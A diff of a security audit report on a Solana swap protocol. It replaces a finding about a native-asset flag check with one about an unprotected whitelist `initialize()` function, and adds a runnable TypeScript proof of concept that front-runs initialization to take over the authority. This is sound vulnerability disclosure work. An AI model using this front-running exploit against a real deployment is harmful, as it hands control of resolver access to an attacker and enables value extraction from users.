@@ -1,253 +1,334 @@
 # Audit Report
 
 ## Title
-Inconsistent Native Asset Flag Allows Cancellation Premium Bypass
+Unprotected Whitelist Initialization Enables Complete Access Control Takeover
 
 ## Summary
-The validation for native asset flags in the `create` function is unidirectional, allowing orders with native mint (WSOL) but `src_asset_is_native = false`. This inconsistency causes resolvers to lose their cancellation premiums when calling `cancel_by_resolver`, receiving only rent lamports (~0.002 SOL) instead of the intended premium deducted from escrowed token value, or causing transaction failures due to arithmetic underflow.
+The whitelist program's `initialize()` function lacks access control, allowing any attacker to front-run the legitimate initialization and become the whitelist authority. This grants complete control over resolver registration, breaking the protocol's fundamental access control mechanism.
 
 ## Finding Description
 
-The protocol validates native asset flags using one-directional OR logic that permits WSOL orders with the native flag set to false. [1](#0-0) 
+The whitelist program contains a critical initialization vulnerability where the `initialize()` function has no access control restrictions. [1](#0-0) 
 
-This validation translates to: "If the mint is NOT native, then the flag MUST be false." However, it erroneously allows: "If the mint IS native, the flag CAN be false."
+The `Initialize` account validation context only requires **any** signer but does not restrict who that signer can be. [2](#0-1)  The function simply takes whoever calls it as the authority and stores their public key.
 
-**Truth Table:**
-- `src_mint == NATIVE_MINT && src_asset_is_native == true` → PASS ✓ (correct)
-- `src_mint == NATIVE_MINT && src_asset_is_native == false` → PASS ✓ (VULNERABLE)
-- `src_mint != NATIVE_MINT && src_asset_is_native == true` → FAIL ✗ (correct)
-- `src_mint != NATIVE_MINT && src_asset_is_native == false` → PASS ✓ (correct)
+The `WhitelistState` account stores the authority that controls all resolver registration operations. [3](#0-2) 
 
-An attacker creates an order with `src_mint = NATIVE_MINT` but `src_asset_is_native = false`. During creation, WSOL tokens are deposited as SPL tokens into escrow. [2](#0-1) 
+This authority is properly enforced in critical operations: registering resolvers [4](#0-3) , deregistering them [5](#0-4) , and transferring authority [6](#0-5) .
 
-The vulnerability manifests in `cancel_by_resolver`. When the flag is false but the mint is WSOL, tokens are transferred back to maker FIRST: [3](#0-2) 
+**Attack Scenario:**
 
-After this transfer, the escrow account only contains rent lamports (~0.00204 SOL). The premium is then calculated and subtracted from these remaining lamports: [4](#0-3) 
+1. Protocol team deploys the whitelist program to mainnet (program ID: `5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S`) [7](#0-6) 
+2. Attacker monitors the deployment and precomputes the deterministic `WhitelistState` PDA address using the seed `WHITELIST_STATE_SEED` [8](#0-7) [9](#0-8) 
+3. Before the protocol can call `initialize()`, the attacker submits a transaction calling `initialize()` with their own keypair as the signer
+4. The `WhitelistState` account is created at the canonical PDA with the attacker's public key as authority
+5. When the protocol attempts to initialize, the transaction fails due to the Anchor `init` constraint - the account already exists
+6. The attacker now controls the whitelist authority and can:
+   - Register malicious resolvers who can fill orders at unfavorable prices
+   - Deregister legitimate resolvers, preventing them from executing orders
+   - Transfer authority to confederates
+   - Completely compromise the protocol's access control system
 
-**Critical Issue**: The calculation expects to deduct the premium from the full escrow value (tokens + rent), but only rent remains.
-
-This causes two failure modes:
-- **Underflow/Transaction Failure**: If `cancellation_premium > rent`, the subtraction underflows causing DoS
-- **Minimal Payment**: If `cancellation_premium < rent`, resolver receives only a fraction of rent instead of the intended premium from token value
-
-The escrow is then closed and remaining lamports transferred: [5](#0-4) 
+The fusion-swap program relies critically on whitelisted resolvers for order filling [10](#0-9)  and cancellation by resolver [11](#0-10) , making this vulnerability critical to the entire protocol's security model.
 
 ## Impact Explanation
 
 **Severity: HIGH**
 
-This vulnerability breaks the protocol's **Fee Correctness** invariant. Resolvers are systematically denied their rightful cancellation premiums, undermining the economic incentive model.
+This vulnerability enables complete compromise of the protocol's access control system with the following impacts:
 
-**Direct Impact:**
-- For a 10 SOL order with 0.5 SOL premium (~5%), resolver receives only ~0.001 SOL instead of 0.5 SOL (99.8% loss)
-- Resolvers lose `(intended_premium - 0.002 SOL)` per exploited order
-- For orders with `max_cancellation_premium = 1 SOL`, 99.8% of premium is effectively stolen
+1. **Access Control Bypass**: An attacker becomes the whitelist authority and can authorize any resolver, breaking the fundamental security invariant that only authorized resolvers can fill orders
 
-**Systemic Impact:**
-- Undermines the protocol's cancellation auction mechanism
-- Expired orders accumulate without proper cleanup incentives
-- Resolver participation decreases due to unprofitable cancellations
-- Protocol reputation damage when resolvers discover systematic underpayment
+2. **Unauthorized Order Execution**: Malicious resolvers can fill orders at prices favorable to themselves, extracting value from makers through unfavorable execution
+
+3. **Protocol Disruption**: Attacker can deregister all legitimate resolvers, preventing normal protocol operation and effectively shutting down the entire fusion swap system
+
+4. **Permanent Compromise**: Once initialized with the wrong authority, there's no recovery mechanism within the program - the protocol team would need to redeploy with a completely new program ID
+
+5. **Multi-User Impact**: Affects all protocol users, as the entire resolver authorization system is compromised
+
+The impact is categorized as HIGH (not CRITICAL) because while it completely compromises access control, it requires front-running during initial deployment and doesn't enable direct theft of tokens from existing escrows. However, it does enable significant value extraction through malicious order fills and complete protocol disruption.
 
 ## Likelihood Explanation
 
-**Likelihood: MEDIUM-HIGH**
+**Likelihood: HIGH**
 
-**Attacker Requirements:**
-- Basic understanding of Solana token accounts and WSOL mechanics
-- Ability to create orders with custom parameters
-- No privileged access required
-- No collusion required
+This attack is highly likely to succeed because:
 
-**Exploitation Complexity:**
-- Simple parameter manipulation during order creation
-- The validation bug makes this trivial to execute
-- Client-side scripts default to `false` for native flags, making accidental exploitation possible: [6](#0-5) 
+1. **Simple Execution**: Requires only a single transaction with no complex setup or coordination
+2. **Low Cost**: Attacker only needs minimal SOL for transaction fees (~0.00001 SOL)
+3. **No Prerequisites**: No special permissions, prior protocol state, or capital requirements
+4. **Detectable Timing**: Program deployment is publicly visible on-chain, giving attackers ample time to prepare front-running transactions
+5. **Single Point of Failure**: The protocol has only one chance to initialize correctly; there's no retry mechanism
+6. **Known Attack Vector**: Front-running initialization is a well-documented vulnerability pattern in blockchain systems
 
-**Detection Difficulty:**
-- Order appears normal on-chain until cancellation attempt
-- Premium loss only visible when resolver calls `cancel_by_resolver`
-- No alerts or monitoring during order lifecycle
-
-**Realistic Scenario:**
-1. Attacker creates 100 orders with 10 SOL each, native mint but flag = false
-2. Sets `max_cancellation_premium = 0.5 SOL` each (total 50 SOL expected premiums)
-3. Orders expire naturally
-4. Resolvers attempt cancellation, receive only ~0.002 SOL per order
-5. Attacker saves ~49.8 SOL in premiums that should have been paid
+The initialization script [12](#0-11)  implements no protection against this attack vector.
 
 ## Recommendation
 
-Replace the unidirectional validation with bidirectional equality checking:
+**Immediate Fix**: Add access control to the `initialize()` function by requiring the signer to match a hardcoded deployer public key or by using Anchor's program upgrade authority check.
 
-```rust
-require!(
-    (ctx.accounts.src_mint.key() == native_mint::id()) == order.src_asset_is_native,
-    FusionError::InconsistentNativeSrcTrait
-);
+**Option 1 - Hardcoded Deployer**:
+Add a constraint to the `Initialize` struct requiring the authority to match an expected public key: [2](#0-1) 
 
-require!(
-    (ctx.accounts.dst_mint.key() == native_mint::id()) == order.dst_asset_is_native,
-    FusionError::InconsistentNativeDstTrait
-);
-```
+Add a constant at the top of the program defining the expected deployer and modify the struct to include a constraint checking the authority matches this address.
 
-This ensures:
-- If mint is native → flag must be true
-- If mint is not native → flag must be false
+**Option 2 - Upgrade Authority Check**:
+Use Anchor's program upgrade authority validation to ensure only the program's upgrade authority can initialize the whitelist state. This ties initialization rights to program deployment rights.
 
-Apply the same fix to the `cancel` function validation.
+**Option 3 - Two-Step Initialization**:
+Implement a two-step initialization process where the first step creates the account with a temporary state, and the second step (callable only by the upgrade authority or deployer) finalizes it. This prevents front-running as the attacker cannot complete initialization.
 
 ## Proof of Concept
 
-While a complete runnable test is recommended for HIGH severity findings, the vulnerability can be demonstrated with the following test flow:
+```typescript
+import * as anchor from "@coral-xyz/anchor";
+import { expect } from "chai";
+import { Whitelist } from "../../target/types/whitelist";
 
-1. Create order with:
-   - `src_mint = NATIVE_MINT` (WSOL)
-   - `src_asset_is_native = false`
-   - `src_amount = 10_000_000_000` (10 SOL)
-   - `max_cancellation_premium = 500_000_000` (0.5 SOL)
+describe("Whitelist Initialization Front-Running PoC", () => {
+  const provider = anchor.AnchorProvider.env();
+  anchor.setProvider(provider);
+  const program = anchor.workspace.Whitelist as anchor.Program<Whitelist>;
 
-2. Wait for order expiration
+  it("Demonstrates front-running initialization attack", async () => {
+    // Attacker's keypair (any keypair can be used)
+    const attacker = anchor.web3.Keypair.generate();
+    
+    // Fund the attacker
+    await provider.connection.requestAirdrop(
+      attacker.publicKey,
+      1 * anchor.web3.LAMPORTS_PER_SOL
+    );
+    await new Promise(resolve => setTimeout(resolve, 1000));
 
-3. Call `cancel_by_resolver` with a whitelisted resolver
+    // Legitimate protocol team's keypair
+    const legitimateAuthority = anchor.web3.Keypair.generate();
+    await provider.connection.requestAirdrop(
+      legitimateAuthority.publicKey,
+      1 * anchor.web3.LAMPORTS_PER_SOL
+    );
+    await new Promise(resolve => setTimeout(resolve, 1000));
 
-4. Observe:
-   - Tokens transferred back to maker at lines 377-402
-   - Escrow has only ~2,039,280 lamports (rent)
-   - Premium calculation at line 410: `2_039_280 - 500_000_000` underflows
-   - Transaction fails OR (in release mode) wraps to huge number causing subsequent transfer failure
+    // Derive the deterministic WhitelistState PDA
+    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
+      [Buffer.from("whitelist_state")],
+      program.programId
+    );
 
-**Expected**: Resolver should receive 0.5 SOL premium from the 10 SOL token value
-**Actual**: Transaction fails or resolver receives minimal payment
+    // ATTACKER FRONT-RUNS: Initializes the whitelist with their own authority
+    await program.methods
+      .initialize()
+      .accountsPartial({
+        authority: attacker.publicKey,
+        whitelistState: whitelistStatePDA,
+      })
+      .signers([attacker])
+      .rpc();
+
+    // Verify attacker is now the authority
+    const whitelistState = await program.account.whitelistState.fetch(whitelistStatePDA);
+    expect(whitelistState.authority.toString()).to.equal(attacker.publicKey.toString());
+
+    // Legitimate protocol team attempts to initialize
+    try {
+      await program.methods
+        .initialize()
+        .accountsPartial({
+          authority: legitimateAuthority.publicKey,
+          whitelistState: whitelistStatePDA,
+        })
+        .signers([legitimateAuthority])
+        .rpc();
+      
+      // Should not reach here
+      expect.fail("Legitimate initialization should have failed");
+    } catch (error) {
+      // Expected: Account already exists
+      expect(error.toString()).to.include("already in use");
+    }
+
+    // Demonstrate attacker can now register malicious resolvers
+    const maliciousResolver = anchor.web3.Keypair.generate();
+    await program.methods
+      .register(maliciousResolver.publicKey)
+      .accountsPartial({
+        authority: attacker.publicKey,
+      })
+      .signers([attacker])
+      .rpc();
+
+    // Verify malicious resolver is registered
+    const [resolverAccessPDA] = anchor.web3.PublicKey.findProgramAddressSync(
+      [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
+      program.programId
+    );
+    const resolverAccess = await program.account.resolverAccess.fetch(resolverAccessPDA);
+    expect(resolverAccess).to.not.be.null;
+
+    // Demonstrate legitimate authority cannot perform any operations
+    try {
+      await program.methods
+        .register(legitimateAuthority.publicKey)
+        .accountsPartial({
+          authority: legitimateAuthority.publicKey,
+        })
+        .signers([legitimateAuthority])
+        .rpc();
+      
+      expect.fail("Legitimate authority should not be able to register");
+    } catch (error) {
+      // Expected: Unauthorized error
+      expect(error.toString()).to.include("Unauthorized");
+    }
+
+    console.log("✓ Front-running attack successful!");
+    console.log("✓ Attacker is authority:", whitelistState.authority.toString());
+    console.log("✓ Attacker can register malicious resolvers");
+    console.log("✓ Legitimate authority is permanently locked out");
+  });
+});
+```
 
 ## Notes
 
-The vulnerability is confirmed by examining the actual code paths. The validation logic at lines 51-54 uses OR logic that permits the vulnerable state, and the cancellation logic at lines 376-411 demonstrates how this leads to premium bypass. The client script defaults further increase the likelihood of accidental exploitation.
+This vulnerability represents a critical flaw in the initialization pattern. The deterministic nature of the PDA combined with the lack of access control creates a permanent single point of failure during deployment. Once exploited, the only recovery is redeploying the entire program with a new program ID, which would require updating all dependent programs and client integrations.
+
+The vulnerability is particularly severe because the whitelist program controls access to the entire Fusion Protocol's order filling mechanism. An attacker who controls the whitelist authority can effectively control which resolvers are allowed to fill orders, enabling them to:
+- Extract maximum value from order fills through malicious resolver behavior
+- Deny service to legitimate resolvers
+- Gradually replace legitimate resolvers with malicious ones to avoid detection
+
+This is a well-known initialization vulnerability pattern in Solana programs and should be addressed before mainnet deployment.
 
 ### Citations
 
-**File:** programs/fusion-swap/src/lib.rs (L51-54)
+**File:** programs/whitelist/src/lib.rs (L7-7)
 ```rust
-        require!(
-            ctx.accounts.src_mint.key() == native_mint::id() || !order.src_asset_is_native,
-            FusionError::InconsistentNativeSrcTrait
-        );
+declare_id!("5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S");
 ```
 
-**File:** programs/fusion-swap/src/lib.rs (L95-130)
+**File:** programs/whitelist/src/lib.rs (L9-9)
 ```rust
-        require!(
-            order.src_asset_is_native == ctx.accounts.maker_src_ata.is_none(),
-            FusionError::InconsistentNativeSrcTrait
-        );
-
-        // Maker => Escrow
-        if order.src_asset_is_native {
-            // Wrap SOL to wSOL
-            uni_transfer(&UniTransferParams::NativeTransfer {
-                from: ctx.accounts.maker.to_account_info(),
-                to: ctx.accounts.escrow_src_ata.to_account_info(),
-                amount: order.src_amount,
-                program: ctx.accounts.system_program.clone(),
-            })?;
-
-            anchor_spl::token::sync_native(CpiContext::new(
-                ctx.accounts.src_token_program.to_account_info(),
-                anchor_spl::token::SyncNative {
-                    account: ctx.accounts.escrow_src_ata.to_account_info(),
-                },
-            ))
-        } else {
-            uni_transfer(&UniTransferParams::TokenTransfer {
-                from: ctx
-                    .accounts
-                    .maker_src_ata
-                    .as_ref()
-                    .ok_or(FusionError::MissingMakerSrcAta)?
-                    .to_account_info(),
-                authority: ctx.accounts.maker.to_account_info(),
-                to: ctx.accounts.escrow_src_ata.to_account_info(),
-                mint: *ctx.accounts.src_mint.clone(),
-                amount: order.src_amount,
-                program: ctx.accounts.src_token_program.clone(),
-            })
-        }
+pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
 ```
 
-**File:** programs/fusion-swap/src/lib.rs (L376-402)
+**File:** programs/whitelist/src/lib.rs (L18-22)
 ```rust
-        // Return remaining src tokens back to maker
-        if !order.src_asset_is_native {
-            transfer_checked(
-                CpiContext::new_with_signer(
-                    ctx.accounts.src_token_program.to_account_info(),
-                    TransferChecked {
-                        from: ctx.accounts.escrow_src_ata.to_account_info(),
-                        mint: ctx.accounts.src_mint.to_account_info(),
-                        to: ctx
-                            .accounts
-                            .maker_src_ata
-                            .as_ref()
-                            .ok_or(FusionError::MissingMakerSrcAta)?
-                            .to_account_info(),
-                        authority: ctx.accounts.escrow.to_account_info(),
-                    },
-                    &[&[
-                        "escrow".as_bytes(),
-                        ctx.accounts.maker.key().as_ref(),
-                        &order_hash,
-                        &[ctx.bumps.escrow],
-                    ]],
-                ),
-                ctx.accounts.escrow_src_ata.amount,
-                ctx.accounts.src_mint.decimals,
-            )?;
-        };
-```
-
-**File:** programs/fusion-swap/src/lib.rs (L404-411)
-```rust
-        let cancellation_premium = calculate_premium(
-            current_timestamp as u32,
-            order.expiration_time,
-            order.cancellation_auction_duration,
-            order.fee.max_cancellation_premium,
-        );
-        let maker_amount = ctx.accounts.escrow_src_ata.to_account_info().lamports()
-            - std::cmp::min(cancellation_premium, reward_limit);
-```
-
-**File:** programs/fusion-swap/src/lib.rs (L413-436)
-```rust
-        // Transfer all the remaining lamports to the resolver first
-        close_account(CpiContext::new_with_signer(
-            ctx.accounts.src_token_program.to_account_info(),
-            CloseAccount {
-                account: ctx.accounts.escrow_src_ata.to_account_info(),
-                destination: ctx.accounts.resolver.to_account_info(),
-                authority: ctx.accounts.escrow.to_account_info(),
-            },
-            &[&[
-                "escrow".as_bytes(),
-                ctx.accounts.maker.key().as_ref(),
-                &order_hash,
-                &[ctx.bumps.escrow],
-            ]],
-        ))?;
-
-        // Transfer all lamports from the closed account, minus the cancellation premium, to the maker
-        uni_transfer(&UniTransferParams::NativeTransfer {
-            from: ctx.accounts.resolver.to_account_info(),
-            to: ctx.accounts.maker.to_account_info(),
-            amount: maker_amount,
-            program: ctx.accounts.system_program.clone(),
-        })
+    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+        let whitelist_state = &mut ctx.accounts.whitelist_state;
+        whitelist_state.authority = ctx.accounts.authority.key();
+        Ok(())
     }
 ```
 
-**File:** scripts/fusion-swap/create.ts (L43-44)
+**File:** programs/whitelist/src/lib.rs (L43-58)
+```rust
+#[derive(Accounts)]
+pub struct Initialize<'info> {
+    #[account(mut)]
+    pub authority: Signer<'info>,
+
+    #[account(
+        init,
+        payer = authority,
+        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
+        seeds = [WHITELIST_STATE_SEED],
+        bump,
+    )]
+    pub whitelist_state: Account<'info, WhitelistState>,
+
+    pub system_program: Program<'info, System>,
+}
+```
+
+**File:** programs/whitelist/src/lib.rs (L66-72)
+```rust
+    #[account(
+      seeds = [WHITELIST_STATE_SEED],
+      bump,
+      // Ensures only the whitelist authority can register new users
+      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
+    )]
+    pub whitelist_state: Account<'info, WhitelistState>,
+```
+
+**File:** programs/whitelist/src/lib.rs (L92-98)
+```rust
+    #[account(
+      seeds = [WHITELIST_STATE_SEED],
+      bump,
+      // Ensures only the whitelist authority can deregister users from the whitelist
+      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
+    )]
+    pub whitelist_state: Account<'info, WhitelistState>,
+```
+
+**File:** programs/whitelist/src/lib.rs (L115-122)
+```rust
+    #[account(
+        mut,
+        seeds = [WHITELIST_STATE_SEED],
+        bump,
+        // Ensures only the current authority can set new authority
+        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
+    )]
+    pub whitelist_state: Account<'info, WhitelistState>,
+```
+
+**File:** programs/whitelist/src/lib.rs (L125-129)
+```rust
+#[account]
+#[derive(InitSpace)]
+pub struct WhitelistState {
+    pub authority: Pubkey,
+}
+```
+
+**File:** programs/fusion-swap/src/lib.rs (L511-516)
+```rust
+    #[account(
+        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
+        bump = resolver_access.bump,
+        seeds::program = whitelist::ID,
+    )]
+    resolver_access: Account<'info, whitelist::ResolverAccess>,
+```
+
+**File:** programs/fusion-swap/src/lib.rs (L647-653)
+```rust
+    /// Account allowed to cancel the order
+    #[account(
+        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
+        bump = resolver_access.bump,
+        seeds::program = whitelist::ID,
+    )]
+    resolver_access: Account<'info, whitelist::ResolverAccess>,
+```
+
+**File:** scripts/whitelsit/initialize.ts (L20-42)
 ```typescript
-  srcAssetIsNative: boolean = false,
-  dstAssetIsNative: boolean = false,
+async function initialize(
+  connection: Connection,
+  program: Program<Whitelist>,
+  authorityKeypair: Keypair
+): Promise<void> {
+  const whitelistState = findWhitelistStateAddress(program.programId);
+
+  const initializeIx = await program.methods
+    .initialize()
+    .accountsPartial({
+      authority: authorityKeypair.publicKey,
+      whitelistState,
+    })
+    .signers([authorityKeypair])
+    .instruction();
+
+  const tx = new Transaction().add(initializeIx);
+
+  const signature = await sendAndConfirmTransaction(connection, tx, [
+    authorityKeypair,
+  ]);
+  console.log(`Transaction signature ${signature}`);
+}
 ```
